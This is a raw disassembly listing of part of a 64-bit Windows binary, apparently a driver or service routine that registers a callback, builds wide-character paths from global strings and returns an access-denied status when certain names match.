   140004873:	48 83 fa 01          	cmp    $0x1,%rdx
   140004877:	0f 85 52 01 00 00    	jne    0x1400049cf
   14000487d:	48 85 db             	test   %rbx,%rbx
   140004880:	0f 84 49 01 00 00    	je     0x1400049cf
   140004886:	48 8b cb             	mov    %rbx,%rcx
   140004889:	ff 15 39 39 00 00    	call   *0x3939(%rip)        # 0x1400081c8
   14000488f:	84 c0                	test   %al,%al
   140004891:	0f 84 38 01 00 00    	je     0x1400049cf
   140004897:	48 8b 13             	mov    (%rbx),%rdx
   14000489a:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000489f:	45 33 c0             	xor    %r8d,%r8d
   1400048a2:	48 8d 0d 57 99 00 00 	lea    0x9957(%rip),%rcx        # 0x14000e200
   1400048a9:	ff 15 69 39 00 00    	call   *0x3969(%rip)        # 0x140008218
   1400048af:	be 22 00 00 c0       	mov    $0xc0000022,%esi
   1400048b4:	85 c0                	test   %eax,%eax
   1400048b6:	78 1c                	js     0x1400048d4
   1400048b8:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400048bd:	4c 8b c5             	mov    %rbp,%r8
   1400048c0:	0f b7 11             	movzwl (%rcx),%edx
   1400048c3:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400048c7:	d1 ea                	shr    $1,%edx
   1400048c9:	e8 aa 1c 00 00       	call   0x140006578
   1400048ce:	48 85 c0             	test   %rax,%rax
   1400048d1:	0f 45 fe             	cmovne %esi,%edi
   1400048d4:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400048d8:	ff 15 ea 38 00 00    	call   *0x38ea(%rip)        # 0x1400081c8
   1400048de:	84 c0                	test   %al,%al
   1400048e0:	0f 84 e9 00 00 00    	je     0x1400049cf
   1400048e6:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400048ea:	0f b7 10             	movzwl (%rax),%edx
   1400048ed:	66 85 d2             	test   %dx,%dx
   1400048f0:	0f 84 d9 00 00 00    	je     0x1400049cf
   1400048f6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400048fa:	48 85 c9             	test   %rcx,%rcx
   1400048fd:	0f 84 cc 00 00 00    	je     0x1400049cf
   140004903:	4c 8b 05 66 57 00 00 	mov    0x5766(%rip),%r8        # 0x14000a070
   14000490a:	d1 ea                	shr    $1,%edx
   14000490c:	e8 67 1c 00 00       	call   0x140006578
   140004911:	48 85 c0             	test   %rax,%rax
   140004914:	75 22                	jne    0x140004938
   140004916:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000491a:	4c 8b 05 57 57 00 00 	mov    0x5757(%rip),%r8        # 0x14000a078
   140004921:	0f b7 11             	movzwl (%rcx),%edx
   140004924:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004928:	d1 ea                	shr    $1,%edx
   14000492a:	e8 49 1c 00 00       	call   0x140006578
   14000492f:	48 85 c0             	test   %rax,%rax
   140004932:	0f 84 97 00 00 00    	je     0x1400049cf
   140004938:	8b fe                	mov    %esi,%edi
   14000493a:	e9 90 00 00 00       	jmp    0x1400049cf
   14000493f:	48 85 db             	test   %rbx,%rbx
   140004942:	0f 84 87 00 00 00    	je     0x1400049cf
   140004948:	48 8b cb             	mov    %rbx,%rcx
   14000494b:	ff 15 77 38 00 00    	call   *0x3877(%rip)        # 0x1400081c8
   140004951:	84 c0                	test   %al,%al
   140004953:	74 7a                	je     0x1400049cf
   140004955:	48 8b 13             	mov    (%rbx),%rdx
   140004958:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000495d:	45 33 c0             	xor    %r8d,%r8d
   140004960:	48 8d 0d 99 98 00 00 	lea    0x9899(%rip),%rcx        # 0x14000e200
   140004967:	ff 15 ab 38 00 00    	call   *0x38ab(%rip)        # 0x140008218
   14000496d:	85 c0                	test   %eax,%eax
   14000496f:	78 5e                	js     0x1400049cf
   140004971:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004976:	4c 8b c5             	mov    %rbp,%r8
   140004979:	0f b7 11             	movzwl (%rcx),%edx
   14000497c:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004980:	d1 ea                	shr    $1,%edx
   140004982:	e8 f1 1b 00 00       	call   0x140006578
   140004987:	48 85 c0             	test   %rax,%rax
   14000498a:	75 3e                	jne    0x1400049ca
   14000498c:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004991:	4c 8b 05 10 57 00 00 	mov    0x5710(%rip),%r8        # 0x14000a0a8
   140004998:	0f b7 11             	movzwl (%rcx),%edx
   14000499b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000499f:	d1 ea                	shr    $1,%edx
   1400049a1:	e8 d2 1b 00 00       	call   0x140006578
   1400049a6:	48 85 c0             	test   %rax,%rax
   1400049a9:	75 1f                	jne    0x1400049ca
   1400049ab:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400049b0:	4c 8b 05 f9 56 00 00 	mov    0x56f9(%rip),%r8        # 0x14000a0b0
   1400049b7:	0f b7 11             	movzwl (%rcx),%edx
   1400049ba:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400049be:	d1 ea                	shr    $1,%edx
   1400049c0:	e8 b3 1b 00 00       	call   0x140006578
   1400049c5:	48 85 c0             	test   %rax,%rax
   1400049c8:	74 05                	je     0x1400049cf
   1400049ca:	bf 22 00 00 c0       	mov    $0xc0000022,%edi
   1400049cf:	8b c7                	mov    %edi,%eax
   1400049d1:	eb 02                	jmp    0x1400049d5
   1400049d3:	33 c0                	xor    %eax,%eax
   1400049d5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400049da:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400049df:	48 83 c4 20          	add    $0x20,%rsp
   1400049e3:	41 5e                	pop    %r14
   1400049e5:	5f                   	pop    %rdi
   1400049e6:	5e                   	pop    %rsi
   1400049e7:	c3                   	ret
   1400049e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400049ec:	80 3d 15 98 00 00 00 	cmpb   $0x0,0x9815(%rip)        # 0x14000e208
   1400049f3:	74 14                	je     0x140004a09
   1400049f5:	48 8b 0d 04 98 00 00 	mov    0x9804(%rip),%rcx        # 0x14000e200
   1400049fc:	ff 15 06 38 00 00    	call   *0x3806(%rip)        # 0x140008208
   140004a02:	c6 05 ff 97 00 00 00 	movb   $0x0,0x97ff(%rip)        # 0x14000e208
   140004a09:	48 83 c4 28          	add    $0x28,%rsp
   140004a0d:	c3                   	ret
   140004a0e:	cc                   	int3
   140004a0f:	cc                   	int3
   140004a10:	40 53                	rex push %rbx
   140004a12:	48 83 ec 40          	sub    $0x40,%rsp
   140004a16:	80 3d eb 97 00 00 00 	cmpb   $0x0,0x97eb(%rip)        # 0x14000e208
   140004a1d:	48 8b d9             	mov    %rcx,%rbx
   140004a20:	74 04                	je     0x140004a26
   140004a22:	b0 01                	mov    $0x1,%al
   140004a24:	eb 47                	jmp    0x140004a6d
   140004a26:	48 8d 15 43 2c 00 00 	lea    0x2c43(%rip),%rdx        # 0x140007670
   140004a2d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004a32:	ff 15 08 39 00 00    	call   *0x3908(%rip)        # 0x140008340
   140004a38:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004a3e:	48 8d 05 bb 97 00 00 	lea    0x97bb(%rip),%rax        # 0x14000e200
   140004a45:	45 33 c9             	xor    %r9d,%r9d
   140004a48:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004a4d:	4c 8b c3             	mov    %rbx,%r8
   140004a50:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004a55:	48 8d 0d b4 fd ff ff 	lea    -0x24c(%rip),%rcx        # 0x140004810
   140004a5c:	ff 15 ae 37 00 00    	call   *0x37ae(%rip)        # 0x140008210
   140004a62:	85 c0                	test   %eax,%eax
   140004a64:	0f 99 c0             	setns  %al
   140004a67:	88 05 9b 97 00 00    	mov    %al,0x979b(%rip)        # 0x14000e208
   140004a6d:	48 83 c4 40          	add    $0x40,%rsp
   140004a71:	5b                   	pop    %rbx
   140004a72:	c3                   	ret
   140004a73:	cc                   	int3
   140004a74:	48 89 0d 95 97 00 00 	mov    %rcx,0x9795(%rip)        # 0x14000e210
   140004a7b:	c3                   	ret
   140004a7c:	40 53                	rex push %rbx
   140004a7e:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
   140004a85:	48 8b 05 54 56 00 00 	mov    0x5654(%rip),%rax        # 0x14000a0e0
   140004a8c:	48 33 c4             	xor    %rsp,%rax
   140004a8f:	48 89 84 24 30 04 00 	mov    %rax,0x430(%rsp)
   140004a96:	00 
   140004a97:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004a9d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004aa2:	33 d2                	xor    %edx,%edx
   140004aa4:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140004aaa:	e8 91 26 00 00       	call   0x140007140
   140004aaf:	32 db                	xor    %bl,%bl
   140004ab1:	e8 a6 00 00 00       	call   0x140004b5c
   140004ab6:	84 c0                	test   %al,%al
   140004ab8:	0f 84 83 00 00 00    	je     0x140004b41
   140004abe:	48 8b 15 cb 55 00 00 	mov    0x55cb(%rip),%rdx        # 0x14000a090
   140004ac5:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140004aca:	48 8d 0d 5f 97 00 00 	lea    0x975f(%rip),%rcx        # 0x14000e230
   140004ad1:	e8 ba 21 00 00       	call   0x140006c90
   140004ad6:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004adb:	85 c0                	test   %eax,%eax
   140004add:	78 53                	js     0x140004b32
   140004adf:	48 85 c9             	test   %rcx,%rcx
   140004ae2:	74 5b                	je     0x140004b3f
   140004ae4:	48 8d 51 0c          	lea    0xc(%rcx),%rdx
   140004ae8:	48 85 d2             	test   %rdx,%rdx
   140004aeb:	74 45                	je     0x140004b32
   140004aed:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   140004af1:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140004af5:	3d ff 03 00 00       	cmp    $0x3ff,%eax
   140004afa:	77 36                	ja     0x140004b32
   140004afc:	45 8b c1             	mov    %r9d,%r8d
   140004aff:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b04:	e8 37 27 00 00       	call   0x140007240
   140004b09:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140004b0f:	48 8d 15 1a af 00 00 	lea    0xaf1a(%rip),%rdx        # 0x14000fa30
   140004b16:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b1b:	e8 da 24 00 00       	call   0x140006ffa
   140004b20:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004b25:	0f b6 db             	movzbl %bl,%ebx
   140004b28:	85 c0                	test   %eax,%eax
   140004b2a:	0f 44 d9             	cmove  %ecx,%ebx
   140004b2d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004b32:	48 85 c9             	test   %rcx,%rcx
   140004b35:	74 08                	je     0x140004b3f
   140004b37:	33 d2                	xor    %edx,%edx
   140004b39:	ff 15 c9 37 00 00    	call   *0x37c9(%rip)        # 0x140008308
   140004b3f:	8a c3                	mov    %bl,%al
   140004b41:	48 8b 8c 24 30 04 00 	mov    0x430(%rsp),%rcx
   140004b48:	00 
   140004b49:	48 33 cc             	xor    %rsp,%rcx
   140004b4c:	e8 df 24 00 00       	call   0x140007030
   140004b51:	48 81 c4 40 04 00 00 	add    $0x440,%rsp
   140004b58:	5b                   	pop    %rbx
   140004b59:	c3                   	ret
   140004b5a:	cc                   	int3
   140004b5b:	cc                   	int3
   140004b5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b61:	57                   	push   %rdi
   140004b62:	48 83 ec 20          	sub    $0x20,%rsp
   140004b66:	33 db                	xor    %ebx,%ebx
   140004b68:	48 39 1d b1 96 00 00 	cmp    %rbx,0x96b1(%rip)        # 0x14000e220
   140004b6f:	74 07                	je     0x140004b78
   140004b71:	b0 01                	mov    $0x1,%al
   140004b73:	e9 33 01 00 00       	jmp    0x140004cab
   140004b78:	e8 27 1e 00 00       	call   0x1400069a4
   140004b7d:	48 89 05 9c 96 00 00 	mov    %rax,0x969c(%rip)        # 0x14000e220
   140004b84:	48 85 c0             	test   %rax,%rax
   140004b87:	0f 84 14 01 00 00    	je     0x140004ca1
   140004b8d:	33 c0                	xor    %eax,%eax
   140004b8f:	4c 8d 05 9a 96 00 00 	lea    0x969a(%rip),%r8        # 0x14000e230
   140004b96:	41 b9 00 08 00 00    	mov    $0x800,%r9d
   140004b9c:	48 8d 15 8d 9e 00 00 	lea    0x9e8d(%rip),%rdx        # 0x14000ea30
   140004ba3:	49 8b f8             	mov    %r8,%rdi
   140004ba6:	41 8b c9             	mov    %r9d,%ecx
   140004ba9:	f3 aa                	rep stos %al,(%rdi)
   140004bab:	48 8b fa             	mov    %rdx,%rdi
   140004bae:	44 8d 50 02          	lea    0x2(%rax),%r10d
   140004bb2:	41 8b c9             	mov    %r9d,%ecx
   140004bb5:	f3 aa                	rep stos %al,(%rdi)
   140004bb7:	49 8b c8             	mov    %r8,%rcx
   140004bba:	49 2b ca             	sub    %r10,%rcx
   140004bbd:	49 03 ca             	add    %r10,%rcx
   140004bc0:	66 39 19             	cmp    %bx,(%rcx)
   140004bc3:	75 f8                	jne    0x140004bbd
   140004bc5:	4c 8b 0d d4 54 00 00 	mov    0x54d4(%rip),%r9        # 0x14000a0a0
   140004bcc:	33 ff                	xor    %edi,%edi
   140004bce:	41 0f b7 04 79       	movzwl (%r9,%rdi,2),%eax
   140004bd3:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004bd7:	48 ff c7             	inc    %rdi
   140004bda:	66 85 c0             	test   %ax,%ax
   140004bdd:	75 ef                	jne    0x140004bce
   140004bdf:	49 8b c8             	mov    %r8,%rcx
   140004be2:	49 2b ca             	sub    %r10,%rcx
   140004be5:	49 03 ca             	add    %r10,%rcx
   140004be8:	66 39 19             	cmp    %bx,(%rcx)
   140004beb:	75 f8                	jne    0x140004be5
   140004bed:	4c 8b 0d 2c 96 00 00 	mov    0x962c(%rip),%r9        # 0x14000e220
   140004bf4:	33 ff                	xor    %edi,%edi
   140004bf6:	41 0f b7 04 79       	movzwl (%r9,%rdi,2),%eax
   140004bfb:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004bff:	48 ff c7             	inc    %rdi
   140004c02:	66 85 c0             	test   %ax,%ax
   140004c05:	75 ef                	jne    0x140004bf6
   140004c07:	4d 2b c2             	sub    %r10,%r8
   140004c0a:	4d 03 c2             	add    %r10,%r8
   140004c0d:	66 41 39 18          	cmp    %bx,(%r8)
   140004c11:	75 f7                	jne    0x140004c0a
   140004c13:	48 8b 3d 8e 54 00 00 	mov    0x548e(%rip),%rdi        # 0x14000a0a8
   140004c1a:	33 c9                	xor    %ecx,%ecx
   140004c1c:	0f b7 04 4f          	movzwl (%rdi,%rcx,2),%eax
   140004c20:	66 41 89 04 48       	mov    %ax,(%r8,%rcx,2)
   140004c25:	48 ff c1             	inc    %rcx
   140004c28:	66 85 c0             	test   %ax,%ax
   140004c2b:	75 ef                	jne    0x140004c1c
   140004c2d:	48 8b ca             	mov    %rdx,%rcx
   140004c30:	49 2b ca             	sub    %r10,%rcx
   140004c33:	49 03 ca             	add    %r10,%rcx
   140004c36:	66 39 19             	cmp    %bx,(%rcx)
   140004c39:	75 f8                	jne    0x140004c33
   140004c3b:	4c 8b 05 5e 54 00 00 	mov    0x545e(%rip),%r8        # 0x14000a0a0
   140004c42:	33 ff                	xor    %edi,%edi
   140004c44:	41 0f b7 04 78       	movzwl (%r8,%rdi,2),%eax
   140004c49:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004c4d:	48 ff c7             	inc    %rdi
   140004c50:	66 85 c0             	test   %ax,%ax
   140004c53:	75 ef                	jne    0x140004c44
   140004c55:	48 8b ca             	mov    %rdx,%rcx
   140004c58:	49 2b ca             	sub    %r10,%rcx
   140004c5b:	49 03 ca             	add    %r10,%rcx
   140004c5e:	66 39 19             	cmp    %bx,(%rcx)
   140004c61:	75 f8                	jne    0x140004c5b
   140004c63:	4c 8b 05 b6 95 00 00 	mov    0x95b6(%rip),%r8        # 0x14000e220
   140004c6a:	33 ff                	xor    %edi,%edi
   140004c6c:	41 0f b7 04 78       	movzwl (%r8,%rdi,2),%eax
   140004c71:	66 89 04 79          	mov    %ax,(%rcx,%rdi,2)
   140004c75:	48 ff c7             	inc    %rdi
   140004c78:	66 85 c0             	test   %ax,%ax
   140004c7b:	75 ef                	jne    0x140004c6c
   140004c7d:	49 2b d2             	sub    %r10,%rdx
   140004c80:	49 03 d2             	add    %r10,%rdx
   140004c83:	66 39 1a             	cmp    %bx,(%rdx)
   140004c86:	75 f8                	jne    0x140004c80
   140004c88:	48 8b 3d 21 54 00 00 	mov    0x5421(%rip),%rdi        # 0x14000a0b0
   140004c8f:	33 c9                	xor    %ecx,%ecx
   140004c91:	0f b7 04 4f          	movzwl (%rdi,%rcx,2),%eax
   140004c95:	66 89 04 4a          	mov    %ax,(%rdx,%rcx,2)
   140004c99:	48 ff c1             	inc    %rcx
   140004c9c:	66 85 c0             	test   %ax,%ax
   140004c9f:	75 f0                	jne    0x140004c91
   140004ca1:	48 39 1d 78 95 00 00 	cmp    %rbx,0x9578(%rip)        # 0x14000e220
   140004ca8:	0f 95 c0             	setne  %al
   140004cab:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004cb0:	48 83 c4 20          	add    $0x20,%rsp
   140004cb4:	5f                   	pop    %rdi
   140004cb5:	c3                   	ret
   140004cb6:	cc                   	int3
   140004cb7:	cc                   	int3
   140004cb8:	48 83 ec 28          	sub    $0x28,%rsp
   140004cbc:	e8 9b fe ff ff       	call   0x140004b5c
   140004cc1:	84 c0                	test   %al,%al
   140004cc3:	75 02                	jne    0x140004cc7
   140004cc5:	eb 5e                	jmp    0x140004d25
   140004cc7:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004ccc:	48 8d 0d 5d 95 00 00 	lea    0x955d(%rip),%rcx        # 0x14000e230
   140004cd3:	e8 ac 1b 00 00       	call   0x140006884
   140004cd8:	85 c0                	test   %eax,%eax
   140004cda:	78 16                	js     0x140004cf2
   140004cdc:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004ce1:	b2 01                	mov    $0x1,%dl
   140004ce3:	e8 9c 19 00 00       	call   0x140006684
   140004ce8:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004ced:	e8 7a 1b 00 00       	call   0x14000686c
   140004cf2:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140004cf8:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004cfd:	48 8d 0d 2c 9d 00 00 	lea    0x9d2c(%rip),%rcx        # 0x14000ea30
   140004d04:	e8 7b 1b 00 00       	call   0x140006884
   140004d09:	85 c0                	test   %eax,%eax
   140004d0b:	78 16                	js     0x140004d23
   140004d0d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004d12:	b2 01                	mov    $0x1,%dl
   140004d14:	e8 6b 19 00 00       	call   0x140006684
   140004d19:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004d1e:	e8 49 1b 00 00       	call   0x14000686c
   140004d23:	b0 01                	mov    $0x1,%al
   140004d25:	48 83 c4 28          	add    $0x28,%rsp
   140004d29:	c3                   	ret
   140004d2a:	cc                   	int3
   140004d2b:	cc                   	int3
   140004d2c:	48 8b c4             	mov    %rsp,%rax
   140004d2f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004d33:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004d37:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140004d3b:	41 56                	push   %r14
   140004d3d:	48 83 ec 30          	sub    $0x30,%rsp
   140004d41:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004d44:	49 8b d8             	mov    %r8,%rbx
   140004d47:	4c 8b c9             	mov    %rcx,%r9
   140004d4a:	0f 11 40 e8          	movups %xmm0,-0x18(%rax)
   140004d4e:	84 d2                	test   %dl,%dl
   140004d50:	0f 84 c2 00 00 00    	je     0x140004e18
   140004d56:	48 85 c9             	test   %rcx,%rcx
   140004d59:	0f 84 b9 00 00 00    	je     0x140004e18
   140004d5f:	80 39 00             	cmpb   $0x0,(%rcx)
   140004d62:	0f 84 b0 00 00 00    	je     0x140004e18
   140004d68:	4c 8d 35 c1 a4 00 00 	lea    0xa4c1(%rip),%r14        # 0x14000f230
   140004d6f:	bd 00 04 00 00       	mov    $0x400,%ebp
   140004d74:	33 c0                	xor    %eax,%eax
   140004d76:	49 8b fe             	mov    %r14,%rdi
   140004d79:	8b cd                	mov    %ebp,%ecx
   140004d7b:	44 8b c5             	mov    %ebp,%r8d
   140004d7e:	f3 aa                	rep stos %al,(%rdi)
   140004d80:	49 8b c9             	mov    %r9,%rcx
   140004d83:	49 8b d6             	mov    %r14,%rdx
   140004d86:	e8 ed da ff ff       	call   0x140002878
   140004d8b:	84 c0                	test   %al,%al
   140004d8d:	0f 84 85 00 00 00    	je     0x140004e18
   140004d93:	48 8b 15 6e 52 00 00 	mov    0x526e(%rip),%rdx        # 0x14000a008
   140004d9a:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140004da0:	49 8b ce             	mov    %r14,%rcx
   140004da3:	e8 70 20 00 00       	call   0x140006e18
   140004da8:	48 85 c0             	test   %rax,%rax
   140004dab:	74 6b                	je     0x140004e18
   140004dad:	8b d5                	mov    %ebp,%edx
   140004daf:	49 8b ce             	mov    %r14,%rcx
   140004db2:	e8 79 d7 ff ff       	call   0x140002530
   140004db7:	48 8b f8             	mov    %rax,%rdi
   140004dba:	48 85 c0             	test   %rax,%rax
   140004dbd:	74 55                	je     0x140004e14
   140004dbf:	4c 8d 35 6a a8 00 00 	lea    0xa86a(%rip),%r14        # 0x14000f630
   140004dc6:	44 8b c5             	mov    %ebp,%r8d
   140004dc9:	49 8b d6             	mov    %r14,%rdx
   140004dcc:	48 8b c8             	mov    %rax,%rcx
   140004dcf:	e8 1a 22 00 00       	call   0x140006fee
   140004dd4:	85 c0                	test   %eax,%eax
   140004dd6:	74 39                	je     0x140004e11
   140004dd8:	44 8b c5             	mov    %ebp,%r8d
   140004ddb:	48 8b d7             	mov    %rdi,%rdx
   140004dde:	49 8b ce             	mov    %r14,%rcx
   140004de1:	e8 0e 22 00 00       	call   0x140006ff4
   140004de6:	49 8b d6             	mov    %r14,%rdx
   140004de9:	c6 05 3f ac 00 00 00 	movb   $0x0,0xac3f(%rip)        # 0x14000fa2f
   140004df0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004df5:	ff 15 4d 35 00 00    	call   *0x354d(%rip)        # 0x140008348
   140004dfb:	48 8d 15 2e ac 00 00 	lea    0xac2e(%rip),%rdx        # 0x14000fa30
   140004e02:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004e07:	e8 e8 16 00 00       	call   0x1400064f4
   140004e0c:	c6 03 01             	movb   $0x1,(%rbx)
   140004e0f:	eb 03                	jmp    0x140004e14
   140004e11:	c6 03 00             	movb   $0x0,(%rbx)
   140004e14:	b0 01                	mov    $0x1,%al
   140004e16:	eb 02                	jmp    0x140004e1a
   140004e18:	32 c0                	xor    %al,%al
   140004e1a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004e1f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004e24:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140004e29:	48 83 c4 30          	add    $0x30,%rsp
   140004e2d:	41 5e                	pop    %r14
   140004e2f:	c3                   	ret
   140004e30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e35:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004e3a:	57                   	push   %rdi
   140004e3b:	48 83 ec 30          	sub    $0x30,%rsp
   140004e3f:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140004e43:	48 8d 35 e6 a7 00 00 	lea    0xa7e6(%rip),%rsi        # 0x14000f630
   140004e4a:	48 8b df             	mov    %rdi,%rbx
   140004e4d:	48 ff c3             	inc    %rbx
   140004e50:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   140004e54:	75 f7                	jne    0x140004e4d
   140004e56:	e8 01 fd ff ff       	call   0x140004b5c
   140004e5b:	84 c0                	test   %al,%al
   140004e5d:	0f 84 b6 00 00 00    	je     0x140004f19
   140004e63:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140004e66:	3d fe 01 00 00       	cmp    $0x1fe,%eax
   140004e6b:	0f 87 a6 00 00 00    	ja     0x140004f17
   140004e71:	4c 8d 0d b8 ab 00 00 	lea    0xabb8(%rip),%r9        # 0x14000fa30
   140004e78:	48 ff c7             	inc    %rdi
   140004e7b:	66 41 83 3c 79 00    	cmpw   $0x0,(%r9,%rdi,2)
   140004e81:	75 f5                	jne    0x140004e78
   140004e83:	48 8b 15 06 52 00 00 	mov    0x5206(%rip),%rdx        # 0x14000a090
   140004e8a:	48 8d 0d 9f 93 00 00 	lea    0x939f(%rip),%rcx        # 0x14000e230
   140004e91:	03 ff                	add    %edi,%edi
   140004e93:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004e99:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140004e9d:	e8 ea 1e 00 00       	call   0x140006d8c
   140004ea2:	33 d2                	xor    %edx,%edx
   140004ea4:	48 8d 0d 9d b3 00 00 	lea    0xb39d(%rip),%rcx        # 0x140010248
   140004eab:	41 b8 e8 03 00 00    	mov    $0x3e8,%r8d
   140004eb1:	e8 8a 22 00 00       	call   0x140007140
   140004eb6:	0f 10 05 fb 51 00 00 	movups 0x51fb(%rip),%xmm0        # 0x14000a0b8
   140004ebd:	48 8d 0d 84 b3 00 00 	lea    0xb384(%rip),%rcx        # 0x140010248
   140004ec4:	4c 63 c3             	movslq %ebx,%r8
   140004ec7:	f2 0f 10 0d f9 51 00 	movsd  0x51f9(%rip),%xmm1        # 0x14000a0c8
   140004ece:	00 
   140004ecf:	48 8b d6             	mov    %rsi,%rdx
   140004ed2:	0f 29 05 57 b3 00 00 	movaps %xmm0,0xb357(%rip)        # 0x140010230
   140004ed9:	f2 0f 11 0d 5f b3 00 	movsd  %xmm1,0xb35f(%rip)        # 0x140010240
   140004ee0:	00 
   140004ee1:	e8 5a 23 00 00       	call   0x140007240
   140004ee6:	48 8b 15 93 51 00 00 	mov    0x5193(%rip),%rdx        # 0x14000a080
   140004eed:	8d 0c 5d 18 00 00 00 	lea    0x18(,%rbx,2),%ecx
   140004ef4:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140004ef8:	4c 8d 0d 31 b3 00 00 	lea    0xb331(%rip),%r9        # 0x140010230
   140004eff:	48 8d 0d 2a 9b 00 00 	lea    0x9b2a(%rip),%rcx        # 0x14000ea30
   140004f06:	88 1d 38 b3 00 00    	mov    %bl,0xb338(%rip)        # 0x140010244
   140004f0c:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004f12:	e8 75 1e 00 00       	call   0x140006d8c
   140004f17:	b0 01                	mov    $0x1,%al
   140004f19:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004f1e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004f23:	48 83 c4 30          	add    $0x30,%rsp
   140004f27:	5f                   	pop    %rdi
   140004f28:	c3                   	ret
   140004f29:	cc                   	int3
   140004f2a:	cc                   	int3
   140004f2b:	cc                   	int3
   140004f2c:	48 83 ec 68          	sub    $0x68,%rsp
   140004f30:	48 8b 05 a9 51 00 00 	mov    0x51a9(%rip),%rax        # 0x14000a0e0
   140004f37:	48 33 c4             	xor    %rsp,%rax
   140004f3a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
